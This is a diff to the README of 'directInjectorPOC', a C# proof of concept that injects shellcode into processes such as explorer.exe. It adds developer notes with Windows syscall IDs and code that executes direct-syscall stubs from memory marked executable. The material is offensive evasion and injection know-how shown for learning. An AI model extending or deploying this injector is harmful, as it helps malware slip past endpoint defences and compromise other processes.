@@ -1,6 +1,6 @@
 # directInjectorPOC
 
-Small program written in C#, compatible with .NET >= v3.5 . Only x64. 
+Small program written in C#, compatible with .NET >= v3.5 . Only x64. Works from ws 2008 up to the latest windows 10 update. 
 
 Created as a way to learn more about direct syscalls and their implementation in C#. 
 
@@ -19,6 +19,66 @@ can be changed to
 Inject("explorer", osV, OPENSEC);
 ```
 to inject the shellcode into explorer.exe using the NtMapViewOfSection method. 
+
+#### Dev:
+
+Take a look at syscalls.cs. To create a new syscall:
+- Add the syscall ID to each windows version inside the sysDic dictionary.  
+- Create its function delegate inside the Delegates struct
+- Create a function thar runs GetDelegateForFunctionPointer and invokes the delegate functions (you can just copy paste any of the current ones and change them a little bit to adjust your needs) 
+- If needed, create the required structs inside nativeStructs.cs
+
+For example, if we would like to implement NtClose we can do the following:
+```
+...
+            { "win10-1507", new Dictionary<string, byte>()
+                {
+                    { "openprocess",0x26},
+                    { "allocatevirtualmem", 0x18},
+                    { "writevirtualmem", 0x3A},
+                    { "createremthread", 0xB3},
+                    { "createsection", 0x4A },
+                    { "mapviewofsec", 0x28 },
+                    { "close", 0x0F }
+                }
+            },
+...
+```
+```
+public struct Delegates{
+...
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+            public delegate int NtClose(IntPtr handler);
+...
+```
+```
+        public static NTSTATUS NtClose(IntPtr handle, string os)
+        {
+            byte[] syscall = syscallSkeleton;
+            syscall[4] = sysDic[os]["close"];
+
+            unsafe
+            {
+                fixed (byte* ptr = syscall)
+                {
+
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,
+                        (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
+                    {
+                        throw new Win32Exception();
+                    }
+
+                    Delegates.NtClose myAssemblyFunction = (Delegates.NtClose)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtClose));
+
+                    return (NTSTATUS)myAssemblyFunction(handle);
+                }
+            }
+        }
+```
+
 ##### ToDo:
 
   - Implement more ways to write our shellcode in a remote process (process hollowing, dll hollowing, etc)
